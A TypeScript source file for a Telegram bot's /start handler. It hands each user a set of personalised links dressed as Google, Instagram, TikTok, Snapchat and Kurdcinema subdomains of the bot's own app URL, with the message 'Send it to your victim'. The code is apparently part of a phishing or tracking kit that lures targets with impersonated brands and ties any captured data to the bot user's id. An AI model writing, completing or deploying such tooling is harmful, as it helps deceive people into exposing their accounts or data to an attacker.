import type { CommandContext } from "grammy";
import type { Context } from "~/bot/types";
import { envs } from "~/configs/envs";

type StartContext = CommandContext<Context>;

export async function start(ctx: StartContext) {
	if (!ctx.from) {
		await ctx.reply("Unfortunately, I can't proceed at this time.\n\n" + "Please try again.\n\n" + "/start");
		return;
	}

	const link = `${envs.APP_URL}/${ctx.from.id}`;

	await ctx.reply(
		"Send it to your victim\n\n" +
			"Google:\n" +
			`https://google.${link}\n\n` +
			"Instagram:\n" +
			`https://instagram.${link}\n\n` +
			"Tiktok:\n" +
			`https://tiktok.${link}\n\n` +
			"Snapchat:\n" +
			`https://snapchat.${link}\n\n` +
			"Kurdcinema:\n" +
			`https://kurdcinema.${link}\n\n`,
	);
}
